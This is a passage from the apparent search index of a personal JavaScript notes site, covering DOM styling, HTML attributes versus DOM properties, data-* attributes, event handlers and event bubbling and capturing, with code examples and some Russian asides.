<pre><code>document.querySelector(\"h1\").classList.add(\"done\");\ndocument.querySelector(\"h1\").classList.remove(\"done\");\ndocument.querySelector(\"h1\").classList.toggle(\"done\");\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#style","title":"style","text":"<ul> <li> <p>element.style.[css-property] - corresponds to what\u2019s written in the <code>style</code> attribute</p> <p>All elements on the web page have a 'style' attribute</p> <pre><code>// return the whole bunch of CSS properties of the element(a long list):\ndocument.querySelector(\"h1\").style\n</code></pre> <pre><code>// set background to yellow:\ndocument.querySelector(\"h1\").style.backgroud = \"yellow\";\n</code></pre> <pre><code>&lt;!-- the above is the exact thing as: --&gt;\n&lt;h1 style=\"background: yellow\"&gt;&lt;/h1&gt;\n</code></pre> <pre><code>// two ways to reset style property, e.g. given:\ndocument.body.style.background = 'red';\n\n// 1. set the property to an empty string\ndocument.body.style.background = \"\";\n\n// 2. element.style.removeProperty('style property')\ndocument.body.style.removeProperty('background');\n</code></pre> <pre><code>&lt;!-- Don\u2019t forget to add CSS units to values --&gt;\n&lt;body&gt;\n  &lt;script&gt;\n// doesn't work!\ndocument.body.style.margin = 20;\nalert(document.body.style.margin); // '' (empty string, the assignment is ignored)\n\n// now add the CSS unit (px) - and it works\ndocument.body.style.margin = '20px';\nalert(document.body.style.margin); // 20px\n\nalert(document.body.style.marginTop); // 20px\nalert(document.body.style.marginLeft); // 20px\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;!-- Please note: the browser \u201cunpacks\u201d the property 'style.margin' in the last lines\nand infers 'style.marginLeft' and 'style.marginTop' from it. --&gt;\n</code></pre> <p>For multi-word property the camelCase is used (a dash <code>-</code> means upper case):</p> CSS property \u2192 <code>style</code> object property <code>background-color</code> \u2192 elem.style.backgroundColor <code>z-index</code> \u2192 elem.style.zIndex <code>border-left-width</code> \u2192 elem.style.borderLeftWidth <code>-moz-border-radius</code> \u2192 element.style.MozBorderRadius <code>-webkit-border-radius</code> \u2192 element.style.WebkitBorderRadius <p>and so on...</p> <p>How to apply other staff.</p> <p>To see how to apply <code>important</code> and other rare stuff \u2013 there\u2019s a list of methods at MDN.</p> <p>The <code>element.style</code> property operates only on the value of the <code>\"style\"</code> attribute, without any CSS cascade.</p> <p>To read anything that comes from CSS classes use <code>getComputedStyle(element, [pseudo])</code>, see below.</p> <p>element.style is an object, and it\u2019s read-only, so we can\u2019t set the full style like <code>element.style=\"color: red; width: 100px\"</code>. Instead <code>element.style.cssText</code> below can be used.</p> </li> <li> <p>element.style.cssText - corresponds to the whole \"style\" attribute, the full string of styles</p> <p>element.style.cssText = `css-property1: value1; css-property2: value2; ...` - full style rewrite</p> <pre><code>&lt;div id=\"div\"&gt;Button&lt;/div&gt;\n\n&lt;script&gt;\n// we can set special style flags like \"important\" here\ndiv.style.cssText=`color: red !important;\n    background-color: yellow;\n    width: 100px;\n    text-align: center;\n  `;\n\nalert(div.style.cssText);\n&lt;/script&gt;\n</code></pre> <p>This property is rarely used.</p> <p>Because such assignment removes all existing styles: it does not add, but replaces them. May occasionally delete something needed. But we can safely use it for new elements, when we know we won\u2019t delete an existing style. The code above can be accomplished by setting an attribute: <code>div.setAttribute('style', 'color: red...')</code></p> </li> <li> <p>getComputedStyle(element, [pseudo]) - reads the resolved(= resolved value of the property, usually in <code>px</code> for geometry) styles(with respect to all classes, after all CSS is applied and final values are calculated)</p> <p>[pseudo] - a pseudo-element if required, for instance <code>::before</code>. An empty string or no argument means the element itself.</p> <p>Returns the <code>element.style</code>-like object. Read-only.</p> <pre><code>&lt;head&gt;\n  &lt;style&gt; body { color: red; margin: 5px } &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n  &lt;script&gt;\nlet computedStyle = getComputedStyle(document.body);\n\n// now we can read the margin and the color from it\nalert( computedStyle.marginTop ); // 5px\nalert( computedStyle.color ); // rgb(255, 0, 0)\n&lt;/script&gt;\n\n&lt;/body&gt;\n</code></pre> <p><code>getComputedStyle</code> requires the full property name</p> <p>We should always ask for the exact property that we want, like <code>paddingLeft</code> or <code>marginTop</code> or <code>borderTopWidth</code>. Otherwise the correct result is not guaranteed.</p> <p>Styles applied to <code>:visited</code> links are hidden!</p> <p>Visited links may be colored using <code>:visited</code> CSS pseudoclass.</p> <p>But <code>getComputedStyle</code> does not give access to that color, because otherwise an arbitrary page could find out whether the user visited a link by creating it on the page and checking the styles.</p> <p>JavaScript may not see the styles applied by <code>:visited</code>. And also, there\u2019s a limitation in CSS that forbids applying geometry-changing styles in <code>:visited</code>. That\u2019s to guarantee that there\u2019s no side way for an evil page to test if a link was visited and hence to break the privacy.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#styles-working-tips","title":"styles: working tips","text":"<ul> <li> <p>We should always prefer CSS classes to <code>element.style</code>, because the latter breaks the separation of control concept by adding <code>style</code> attribute to selected element. The <code>element.style</code> should only be used if classes \u201ccan\u2019t handle it\u201d.</p> <p>For example, <code>element.style</code> is acceptable if we calculate coordinates of an element dynamically and want to set them from JavaScript, like this:</p> <pre><code>let top = /* complex calculations */;\nlet left = /*complex calculations*/;\n\nelem.style.left = left; // e.g '123px', calculated at run-time\nelem.style.top = top; // e.g '456px'\n</code></pre> <p>For other cases, like making the text red, adding a background icon \u2013 describe that in CSS and then add the class (JavaScript can do that). That\u2019s more flexible and easier to support.</p> </li> <li> <p>Converting string property value to number using <code>parseInt()</code>, in order to do math with it later.</p> <pre><code>// get element\nconst elem = document.querySelector('h1');\n\n// element style\nconst elemStyle = getComputedStyle(elem);\nconsole.log(elemStyle.paddingLeft); // e.g. 20px\n\n// get number\nconst paddingLeft = parseInt(elemStyle.paddingLeft);\nconsole.log(paddingLeft); // e.g. 20\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#html-attributes-vs-dom-properties","title":"HTML attributes vs. DOM properties","text":"<p>For most situations using DOM properties is preferable.</p> <p>We should refer to attributes only when DOM properties do not suit us, when we need exactly attributes, for instance:</p> <ul> <li>We need a non-standard non-\u201cdata-*\u201d attribute. See Non-standard attributes use cases</li> <li>We want to read the value \u201cas written\u201d in HTML. For instanse: see note about <code>href</code> attribute later on this page.</li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#dom-properties","title":"DOM properties","text":"<p>DOM nodes are regular JavaScript objects.</p> <ul> <li> <p>We can alter them.</p> <pre><code>// create a new property in document.body\ndocument.body.myData = {\nname: 'Caesar',\ntitle: 'Imperator'\n};\nalert(document.body.myData.title); // Imperator\n\n// add a method\ndocument.body.sayTagName = function() {\nalert(this.tagName);\n};\ndocument.body.sayTagName(); // BODY (the value of \"this\" in the method is document.body)\n\n// modify built-in prototypes like Element.prototype and add new methods to all elements\nElement.prototype.sayHi = function() {\nalert(`Hello, I'm ${this.tagName}`);\n};\ndocument.documentElement.sayHi(); // Hello, I'm HTML\ndocument.body.sayHi(); // Hello, I'm BODY\n</code></pre> </li> <li> <p>They can have any value and they are not always strings, i.e. they are typed(\u0442\u0438\u043f\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435)</p> <pre><code>&lt;!-- For instance, the element.input.checked property (for checkboxes) is a boolean --&gt;\n&lt;input id=\"input\" type=\"checkbox\" checked&gt; checkbox\n\n&lt;script&gt;\nlet input = document.querySelecor(\"#input\");\n\nalert(input.getAttribute('checked')); // the attribute value is: empty string\nalert(input.checked); // the property value is: true\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;!-- The \"style\" attribute is a string, but the 'style' property is an object. --&gt;\n&lt;div id=\"div\" style=\"color:red;font-size:120%\"&gt;Hello&lt;/div&gt;\n\n&lt;script&gt;\nlet div = document.querySelecor(\"#div\");\n\n// string\nalert(div.getAttribute('style')); // color:red;font-size:120%\n\n// object\nalert(div.style); // [object CSSStyleDeclaration]\nalert(div.style.color); // red\n&lt;/script&gt;\n</code></pre> <p>Most properties are strings.</p> <p>Quite rarely, even if a DOM property type is a string, its valur may differ from the attribute's value. See note about <code>href</code> attribute later on this page.</p> </li> <li> <p>They are case-sensitive (write <code>element.nodeType</code>, not <code>element.NoDeTyPe</code>).</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#html-attributes","title":"HTML attributes","text":"<p>When the browser parses the HTML to create DOM objects for tags, it recognizes standard attributes and creates the corresponding DOM properties from them. But that doesn\u2019t happen if the attribute is non-standard.</p> <p>Most standard HTML attributes have the corresponding DOM properties. They described in the specification for the corresponding element class(see WHATWG: HTML Living Standard). For instance, <code>HTMLInputElement</code> class is documented at https://html.spec.whatwg.org/#htmlinputelement.</p> <p>Alternative way to get DOM properties</p> <p>If we\u2019d like to get them fast or are interested in a concrete browser specification \u2013 we can always output the element using <code>console.dir(element)</code> and read the properties. Or explore \u201cDOM properties\u201d in the Elements tab of the browser developer tools.</p> <p>HTML attributes have the following features:</p> <ul> <li>Their values are always strings.</li> <li>Their name is case-insensitive (<code>id</code> is same as <code>ID</code>), but usually attributes are lowercased.</li> </ul> <pre><code>&lt;body id=\"test\" something=\"non-standard\"&gt;\n  &lt;script&gt;\nalert(document.body.id); // test\n// non-standard attribute does not yield a property\nalert(document.body.something); // undefined\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>A standard attribute for one element can be unknown for another one. For instance, \"type\" is standard for <code>&lt;input&gt;</code>(<code>HTMLInputElement</code> specification class), but not for <code>&lt;body&gt;</code> (<code>HTMLBodyElement</code> specification class).</p> <pre><code>&lt;body id=\"body\" type=\"...\"&gt;\n  &lt;input id=\"input\" type=\"text\"&gt;\n  &lt;script&gt;\nalert(input.type); // text\nalert(body.type); // undefined: DOM property not created, because it's non-standard\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>Examples of standard attributes and their corresponing DOM nodes properties(depending on their specification class):</p> <ul> <li><code>id</code> \u2013 the value of \u201cid\u201d attribute, for all elements (<code>HTMLElement</code> class).</li> <li><code>value</code> \u2013 the value for <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code> and <code>&lt;textarea&gt;</code> (classes: <code>HTMLInputElement</code>, <code>HTMLSelectElement</code>\u2026).</li> <li> <p><code>href</code> \u2013 the \u201chref\u201d for <code>&lt;a href=\"...\"&gt;</code> (<code>HTMLAnchorElement</code> class).</p> <p><code>href</code> DOM property is always a full URL.</p> <p>Even if the attribute contains a relative URL or just a <code>#hash</code>.</p> <pre><code>&lt;a id=\"a\" href=\"#hello\"&gt;link&lt;/a&gt;\n&lt;script&gt;\nlet a = document.querySelecor(\"#a\");\n\n// attribute\nalert(a.getAttribute('href')); // #hello\n\n// property\nalert(a.href ); // full URL in the form http://site.com/page#hello\n&lt;/script&gt;\n</code></pre> </li> <li> <p>\u2026and much more\u2026</p> </li> </ul> <p>All attributes are accessible by using the following methods:</p> <ul> <li> <p>element.attributes - read all attributes and return an iterable collection(can be iterated with <code>for...of</code> loop) of objects that belong to a built-in Attr class, with <code>name</code> and <code>value</code> properties</p> </li> <li> <p>element.hasAttribute(\"name\") \u2013 checks for existence</p> </li> <li> <p>element.getAttribute(\"name\") \u2013 gets the value as string exactly as written in the HTML</p> <pre><code>document.querySelector(\"img\").getAttribute(\"width\");\n</code></pre> <pre><code>&lt;body something=\"non-standard\"&gt;\n  &lt;script&gt;\nalert(document.body.getAttribute('Something')); // non-standard; the first letter is uppercase here,\n// and in HTML it\u2019s all lowercase. But that doesn\u2019t matter: attribute names are case-insensitive.\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> </li> <li> <p>element.setAttribute(\"name\", \"value\") \u2013 sets the value as string</p> <pre><code>document.querySelector(\"img\").setAttribute(\"width\", \"5px\");\n</code></pre> <p>Can be used to change styles by changing value of 'class' atribute.</p> <p>But this is the \"old school\" way as we have more advanced method to manipulate the style. See above.</p> </li> <li> <p>element.removeAttribute(\"name\") \u2013 removes the attribute</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#property-attribute-synchronization","title":"Property-attribute synchronization","text":"<p>When a standard attribute changes, the corresponding property is auto-updated, and (with some exceptions) vice versa.</p> <p>In the example below id is modified as an attribute, and we can see the property changed too. And then the same backwards:</p> <pre><code>&lt;input&gt;\n\n&lt;script&gt;\nlet input = document.querySelector('input');\n\n// attribute =&gt; property\ninput.setAttribute('id', 'id');\nalert(input.id); // id (updated)\n\n// property =&gt; attribute\ninput.id = 'newId';\nalert(input.getAttribute('id')); // newId (updated)\n&lt;/script&gt;\n</code></pre> <p>But there are exclusions, for instance:</p> <ul> <li> <p><code>element.input.value</code> synchronizes only from attribute \u2192 property, but not back</p> <pre><code>&lt;input&gt;\n\n&lt;script&gt;\nlet input = document.querySelector('input');\n\n// attribute =&gt; property\ninput.setAttribute('value', 'text');\nalert(input.value); // text\n\n// NOT property =&gt; attribute\ninput.value = 'newValue';\nalert(input.getAttribute('value')); // text (not updated!)\n&lt;/script&gt;\n</code></pre> <p>That \u201cfeature\u201d may actually come in handy.</p> <p>Because the user actions may lead to <code>value</code> changes, and then after them, if we want to recover the \u201coriginal\u201d value from HTML, it\u2019s in the attribute.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#non-standard-attributes-use-cases","title":"Non-standard attributes use cases","text":"<ul> <li>To pass custom data from HTML to JavaScript.</li> <li> <p>To \u201cmark\u201d HTML-elements for JavaScript.</p> <pre><code>&lt;!-- mark the div to show \"name\" here --&gt;\n&lt;div show-info=\"name\"&gt;&lt;/div&gt;\n&lt;!-- and age here --&gt;\n&lt;div show-info=\"age\"&gt;&lt;/div&gt;\n\n&lt;script&gt;\n// the code finds an element with the mark and shows what's requested\nlet user = {\nname: \"Pete\",\nage: 25\n};\n\nfor(let div of document.querySelectorAll('[show-info]')) {\n// insert the corresponding info into the field\nlet field = div.getAttribute('show-info');\ndiv.innerHTML = user[field]; // first Pete into \"name\", then 25 into \"age\"\n}\n&lt;/script&gt;\n</code></pre> </li> <li> <p>To style an element.</p> <pre><code>&lt;!--  For instance, here for the order state the attribute \"order-state\" is used:--&gt;\n&lt;style&gt;\n/* styles rely on the custom attribute \"order-state\" */\n.order[order-state=\"new\"] {\ncolor: green;\n}\n\n.order[order-state=\"pending\"] {\ncolor: blue;\n}\n\n.order[order-state=\"canceled\"] {\ncolor: red;\n}\n&lt;/style&gt;\n\n&lt;div class=\"order\" order-state=\"new\"&gt;\n  A new order.\n&lt;/div&gt;\n\n&lt;div class=\"order\" order-state=\"pending\"&gt;\n  A pending order.\n&lt;/div&gt;\n\n&lt;div class=\"order\" order-state=\"canceled\"&gt;\n  A canceled order.\n&lt;/div&gt;\n</code></pre> <p>Why would using an attribute be preferable to having classes like <code>.order-state-new</code>, <code>.order-state-pending</code>, <code>.order-state-canceled</code>? Because an attribute is more convenient to manage. The state can be changed as easy as:</p> <pre><code>// a bit simpler than removing old/adding a new class\ndiv.setAttribute('order-state', 'canceled');\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/Dom/#dataset-dom-property","title":"<code>dataset</code> DOM property","text":"<p>Possible problem with custom(non-standard) attributes: they can appear in standard specifications in the future and therefore become unavailable for our use. To avoid conflicts, there exist \"data-*\" attributes. They are actually a safe way to pass custom data.</p> <p>All attributes starting with \u201cdata-\u201d are reserved for programmers\u2019 use. They are available in the element.dataset.[\u201cdata-*\u201c attribute(with ommited \u201cdata-\u201d part) in camelCase] property.</p> <pre><code>&lt;style&gt;\n.order[data-order-state=\"new\"] {\ncolor: green;\n}\n\n.order[data-order-state=\"pending\"] {\ncolor: blue;\n}\n\n.order[data-order-state=\"canceled\"] {\ncolor: red;\n}\n&lt;/style&gt;\n\n&lt;div id=\"order\" class=\"order\" data-order-state=\"new\"&gt;\n  A new order.\n&lt;/div&gt;\n\n&lt;script&gt;\n// read\nalert(order.dataset.orderState); // new\n\n// modify\norder.dataset.orderState = \"pending\"; // we can not only read, but also modify data-attributes\n&lt;/script&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/Dom/#dom-events","title":"DOM Events","text":"<p>An event is a signal that something has happened(user actions, document events, CSS events etc.). All DOM nodes generate such signals(but events are not limited to DOM).</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#event-handlers","title":"Event handlers","text":"<p>Handler - is a function that assigned to an event and runs when event happens.</p> <p>There are 3 ways to assign event handlers:</p> <ol> <li> <p>HTML attribute: <code>on&lt;event&gt;=\"...\"</code>(<code>...</code> - JavaScript code).</p> <p>The browser reads it, creates a new function from the attribute content and writes it to the DOM property.</p> <pre><code>&lt;!-- inside onclick we use single quotes, because the attribute itself is in double quotes --&gt;\n&lt;input value=\"Click me\" onclick=\"alert('Click!')\" type=\"button\"&gt;\n\n&lt;!-- An HTML-attribute is not a convenient place to write a lot of code,\nso we\u2019d better create a JavaScript function and call it there. --&gt;\n&lt;script&gt;\nfunction countRabbits() {\nfor(let i=1; i&lt;=3; i++) {\nalert(\"Rabbit number \" + i);\n}\n}\n&lt;/script&gt;\n\n&lt;input type=\"button\" onclick=\"countRabbits()\" value=\"Count rabbits!\"&gt;\n</code></pre> <p>Accessing the element using <code>this</code></p> <pre><code>&lt;!-- The value of 'this' inside a handler is the element. The one which has the handler on it. --&gt;\n&lt;button onclick=\"alert(this.innerHTML)\"&gt;Click me&lt;/button&gt; &lt;!-- Click me --&gt;\n</code></pre> <p>HTML attributes are used sparingly.</p> <p>Because JavaScript in the middle of an HTML tag looks a little bit odd and alien. Also can\u2019t write lots of code in there.</p> </li> <li> <p>DOM property: element.on&lt;event&gt; = function.</p> <pre><code>&lt;!-- we can\u2019t assign more than one handler of the particular event --&gt;\n&lt;input type=\"button\" id=\"elem\" onclick=\"alert('Before')\" value=\"Click me\"&gt;\n&lt;script&gt;\nlet elem = document.querySelecor(\"#elem\");\nelem.onclick = function() { // overwrites the existing handler\nalert('After'); // only this will be shown\n};\n&lt;/script&gt;\n</code></pre> <p>Set an existing function as a handler.</p> <pre><code>function sayThanks() {\nalert('Thanks!');\n}\n// function should be assigned without parentheses\nelem.onclick = sayThanks;\n</code></pre> <pre><code>&lt;!-- On the other hand, in the markup we do need the parentheses --&gt;\n&lt;input type=\"button\" id=\"button\" onclick=\"sayThanks()\"&gt;\n</code></pre> <pre><code>/* When the browser reads the attribute, it creates a handler function\nwith body from the attribute content. So the markup generates this property: */\nbutton.onclick = function() {\nsayThanks(); // &lt;-- the attribute content goes here\n};\n</code></pre> <p>To remove a handler \u2013 assign element.on&lt;event&gt; = null</p> </li> <li> <p>Methods: element.addEventListener(event, handler[, options]) to add handler, element.removeEventListener(event, handler[, options]) to remove handler.</p> <ul> <li><code>event</code> - Event name, e.g. <code>\"click\"</code>.</li> <li><code>handler</code> - The handler function.</li> <li> <p><code>options</code> - An additional optional object with properties:</p> <ul> <li><code>once</code>: if <code>true</code>, then the listener is automatically removed after it triggers.</li> <li><code>capture</code>: the phase where to handle the event. See in Bubbling and capturing point.    For historical reasons, <code>options</code> can also be <code>false/true</code>, that\u2019s the same as <code>{capture: false/true}</code>.</li> <li> <p><code>passive</code>: if <code>true</code>, then the handler will not call <code>preventDefault()</code>(trying to do this will throw an error). That\u2019s useful for some mobile events, like <code>touchstart</code> and <code>touchmove</code>, to tell the browser that it should not wait for all handlers to finish before scrolling.</p> <p>For some browsers (Firefox, Chrome), <code>passive</code> is <code>true</code> by default for <code>touchstart</code> and <code>touchmove</code> events.</p> <p>See more about <code>preventDefault()</code> in Preventing browser actions point.</p> </li> </ul> </li> </ul> <p>To remove a handler:</p> <ul> <li> <p>we should pass exactly the same function as was assigned</p> <pre><code>// The handler won\u2019t be removed, because 'removeEventListener' gets another function\n//  \u2013 with the same code, but that doesn\u2019t matter, as it\u2019s a different function object.\nelem.addEventListener(\"click\" , () =&gt; alert('Thanks!'));\n// ....\nelem.removeEventListener(\"click\", () =&gt; alert('Thanks!'));\n\n// Here\u2019s the right way:\nfunction handler() {\nalert('Thanks!');\n}\n\ninput.addEventListener(\"click\", handler);\n// ....\ninput.removeEventListener(\"click\", handler);\n// Please note \u2013 if we don\u2019t store the function in a variable, then we can\u2019t remove it.\n// There\u2019s no way to \u201cread back\u201d handlers assigned by 'addEventListener'.\n</code></pre> </li> <li> <p>also the phase should be the same</p> <p>If we <code>addEventListener(..., true)</code>, then we should mention the same phase in <code>removeEventListener(..., true)</code> to correctly remove the handler.</p> </li> </ul> <p>element.addEventListener(event, handler[, options]) allows to assign multiple handlers to one event.</p> <pre><code>&lt;input id=\"elem\" type=\"button\" value=\"Click me\"/&gt;\n\n&lt;script&gt;\nfunction handler1() {\nalert('Thanks!');\n};\n\nfunction handler2() {\nalert('Thanks again!');\n}\n\nlet elem = documnet.querySelecor(\"#elem\");\nelem.onclick = () =&gt; alert(\"Hello\");\nelem.addEventListener(\"click\", handler1); // Thanks!\nelem.addEventListener(\"click\", handler2); // Thanks again!\n&lt;/script&gt;\n&lt;!-- We can set handlers both using a DOM-property and 'addEventListener'.\nBut generally we use only one of these ways. --&gt;\n</code></pre> <p>For some events, handlers only work with element.addEventListener</p> <ul> <li> <p><code>DOMContentLoaded</code> event - triggers when the document is loaded and DOM is built</p> <pre><code>// will never run\ndocument.onDOMContentLoaded = function() {\nalert(\"DOM built\");\n};\n\n// this way it works\ndocument.addEventListener(\"DOMContentLoaded\", function() {\nalert(\"DOM built\");\n});\n</code></pre> </li> <li> <p><code>transitionend</code> event</p> </li> </ul> <p>Also element.addEventListener supports objects as event handlers. In that case the method <code>handleEvent</code> is called in case of the event.</p> <pre><code>&lt;button id=\"elem\"&gt;Click me&lt;/button&gt;\n\n&lt;script&gt;\nlet obj = {\nhandleEvent(event) {\nalert(event.type + \" at \" + event.currentTarget);\n}\n};\n\nlet elem = document.querySelecor(\"#elem\");\nelem.addEventListener('click', obj);\n&lt;/script&gt;\n&lt;!-- As we can see, when 'addEventListener' receives an object as the handler,\nit calls 'obj.handleEvent(event)' in case of an event. --&gt;\n</code></pre> <p>We could also use a class for that:</p> <pre><code>&lt;button id=\"elem\"&gt;Click me&lt;/button&gt;\n\n&lt;script&gt;\nclass Menu {\nhandleEvent(event) {\nswitch(event.type) {\ncase 'mousedown':\nelem.innerHTML = \"Mouse button pressed\";\nbreak;\ncase 'mouseup':\nelem.innerHTML += \"...and released.\";\nbreak;\n}\n}\n}\n\nlet menu = new Menu();\nelem.addEventListener('mousedown', menu);\nelem.addEventListener('mouseup', menu);\n&lt;/script&gt;\n</code></pre> <p>Here the same object handles both events. Please note that we need to explicitly setup the events to listen using <code>addEventListener</code>. The <code>menu</code> object only gets <code>mousedown</code> and <code>mouseup</code> here, not any other types of events.</p> <p>The method <code>handleEvent</code> does not have to do all the job by itself. It can call other event-specific methods instead, like this:</p> <pre><code>&lt;button id=\"elem\"&gt;Click me&lt;/button&gt;\n\n&lt;script&gt;\nclass Menu {\nhandleEvent(event) {\n// mousedown -&gt; onMousedown OR mouseup -&gt; onMouseup, etc.\nlet method = 'on' + event.type[0].toUpperCase() + event.type.slice(1);\n// call one of the methods that defined below(onMousedown() OR onMouseup(), etc.)\nthis[method]();\n}\n\nonMousedown() {\nelem.innerHTML = \"Mouse button pressed\";\n}\n\nonMouseup() {\nelem.innerHTML += \"...and released.\";\n}\n// Now event handlers are clearly separated, that may be easier to support.\n}\n\nlet menu = new Menu();\nelem.addEventListener('mousedown', menu);\nelem.addEventListener('mouseup', menu);\n&lt;/script&gt;\n</code></pre> </li> </ol>"},{"location":"Dev/Prg/Langs/Js/Dom/#event-object","title":"Event object","text":"<p>No matter how you assign the handler \u2013 it gets an event object as the first argument. That object contains the details about what\u2019s happened.</p> <p>Here\u2019s an example of getting pointer coordinates from the event object:</p> <pre><code>&lt;input type=\"button\" value=\"Click me\" id=\"elem\"&gt;\n\n&lt;script&gt;\nelem.onclick = function(event) {\n// show event type, element and coordinates of the click\nalert(event.type + \" at \" + event.currentTarget);\nalert(\"Coordinates: \" + event.clientX + \":\" + event.clientY);\n};\n// 'event.type' - Event type, here it\u2019s \"click\".\n/* 'event.currentTarget' - Element that handled the event. That\u2019s exactly the same as 'this',\n  unless the handler is an arrow function, or its 'this' is bound(using 'bind') to something else,\n  then we can get the element from 'event.currentTarget'. */\n// 'event.clientX / event.clientY' - Window-relative coordinates of the cursor, for pointer events.\n&lt;/script&gt;\n</code></pre> <p>The event object is also available in HTML handlers.</p> <pre><code>&lt;input type=\"button\" onclick=\"alert(event.type)\" value=\"Event type\"&gt;\n</code></pre> <p>That\u2019s possible because when the browser reads the attribute, it creates a handler like this: <code>function(event) { alert(event.type) }</code>. That is: its first argument is called <code>event</code>, and the body is taken from the attribute.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#bubbling-and-capturing","title":"Bubbling and capturing","text":"<p>\u0412\u0441\u043f\u043b\u044b\u0442\u0438\u0435 \u0438 \u043f\u043e\u0433\u0440\u0443\u0436\u0435\u043d\u0438\u0435</p> <p>When an event happens \u2013 the most nested element where it happens gets labeled as the \u201ctarget element\u201d (<code>event.target</code>). Then:</p> <ul> <li> <p>Phase 1 - Capturing: the event moves down from the <code>document</code> root to <code>event.target</code>, calling handlers assigned with <code>addEventListener(..., true)</code> on the way (<code>true</code> is a shorthand for <code>{capture: true}</code>).</p> <p>Capture phase is invisible for handlers and they only run on the 2nd and 3rd phases when:</p> <p>they added using <code>on&lt;event&gt;</code>-property or using HTML attributes or using two-argument <code>addEventListener(event, handler)</code></p> <p>The capturing phase is used very rarely.</p> <p>Usually we handle events on bubbling.</p> </li> <li> <p>Phase 2 - Target: handlers(on both capturing and bubbling phases, i.e. this phase is not handled separately) are called on the target element itself.</p> </li> <li> <p>Phase 3 - Bubbling: the event bubbles up from <code>event.target</code> to the root (till the <code>document</code> object, and some events even reach <code>window</code>), calling handlers assigned using <code>on&lt;event&gt;</code>, HTML attributes and <code>addEventListener</code> without the 3rd argument or with the 3rd argument <code>false/{capture:false}</code>.</p> <p>Almost all events bubble. Here the list of those that don't:</p> <ul> <li><code>focus</code> event</li> </ul> </li> </ul> <p>Example of both capturing and bubbling in action:</p> <pre><code>&lt;style&gt;\nbody * {\nmargin: 10px;\nborder: 1px solid blue;\n}\n&lt;/style&gt;\n\n&lt;form&gt;FORM\n  &lt;div&gt;DIV\n    &lt;p&gt;P&lt;/p&gt;\n  &lt;/div&gt;\n&lt;/form&gt;\n\n&lt;script&gt;\nfor(let elem of document.querySelectorAll('*')) {\nelem.addEventListener(\"click\", e =&gt; alert(`Capturing: ${elem.tagName}`), true);\nelem.addEventListener(\"click\", e =&gt; alert(`Bubbling: ${elem.tagName}`));\n}\n&lt;/script&gt;\n</code></pre> <p>The code sets click handlers on every element in the document to see which ones are working.</p> <p>If you click on <code>&lt;p&gt;</code>, then the sequence is:</p> <ol> <li><code>HTML</code> \u2192 <code>BODY</code> \u2192 <code>FORM</code> \u2192 <code>DIV</code> \u2192 <code>P</code> (capturing phase, the first listener):</li> <li><code>P</code> \u2192 <code>DIV</code> \u2192 <code>FORM</code> \u2192 <code>BODY</code> \u2192 <code>HTML</code> (bubbling phase, the second listener).</li> </ol> <p>Please note, the <code>P</code> shows up twice, because we\u2019ve set two listeners: capturing and bubbling. The target triggers at the end of the first and at the beginning of the second phase.</p> <p>Listeners on same element and same phase run in their set order.</p> <p>If we have multiple event handlers on the same phase, assigned to the same element with <code>addEventListener</code>, they run in the same order as they are created:</p> <pre><code>elem.addEventListener(\"click\", e =&gt; alert(1)); // guaranteed to trigger first\nelem.addEventListener(\"click\", e =&gt; alert(2));\n</code></pre> <p>Each handler can access event object properties:</p> <ul> <li><code>event.target</code> \u2013 the deepest element that originated the event.</li> <li><code>event.currentTarget</code>(=<code>this</code>) \u2013 the current element that handles the event(the one that has the handler on it)</li> <li><code>event.eventPhase</code> \u2013 the current phase (capturing=1, target=2, bubbling=3). It\u2019s rarely used, because we usually know it in the handler.</li> </ul> <p>Any event handler can stop the event capturing/bubbling by calling:</p> <ul> <li> <p><code>event.stopPropagation()</code> - for a single handler of that event</p> <p>That is if an element has multiple event handlers on a single event, then even if one of them stops the capturing/bubbling, the other ones still execute. In other words, <code>event.stopPropagation()</code> stops the move downwards/upwards, but on the current element all other handlers will run.</p> </li> <li> <p><code>event.stopImmediatePropagation()</code> - for a multiple handlers of that event</p> <p>This method stops the capturing/bubbling and prevents handlers on the current element from running. After it no other handlers execute.</p> </li> </ul> <pre><code>&lt;!-- here 'body.onclick' doesn\u2019t work if you click on &lt;button&gt; --&gt;\n&lt;body onclick=\"alert(`the bubbling doesn't reach here`)\"&gt;\n  &lt;button onclick=\"event.stopPropagation()\"&gt;Click me&lt;/button&gt;\n&lt;/body&gt;\n</code></pre> <p>The <code>event.stop[Immediate]Propagation()</code> during the capturing also prevents the bubbling.</p> <p>In other words, normally the event goes first down (\u201ccapturing\u201d) and then up (\u201cbubbling\u201d). But if <code>event.stop[Immediate]Propagation()</code> is called during the capturing phase, then the event travel stops, no bubbling will occur.</p> <p>Don\u2019t stop bubbling without a need!</p> <p>Bubbling is convenient. Don\u2019t stop it without a real need: obvious and architecturally well thought out. \u0412\u0441\u043f\u043b\u044b\u0442\u0438\u0435 \u2013 \u044d\u0442\u043e \u0443\u0434\u043e\u0431\u043d\u043e. \u041d\u0435 \u043f\u0440\u0435\u043a\u0440\u0430\u0449\u0430\u0439\u0442\u0435 \u0435\u0433\u043e \u0431\u0435\u0437 \u044f\u0432\u043d\u043e\u0439 \u043d\u0443\u0436\u0434\u044b, \u043e\u0447\u0435\u0432\u0438\u0434\u043d\u043e\u0439 \u0438 \u0430\u0440\u0445\u0438\u0442\u0435\u043a\u0442\u0443\u0440\u043d\u043e \u043f\u0440\u043e\u0437\u0440\u0430\u0447\u043d\u043e\u0439.</p> <p>Sometimes <code>event.stopPropagation()</code> creates hidden pitfalls that later may become 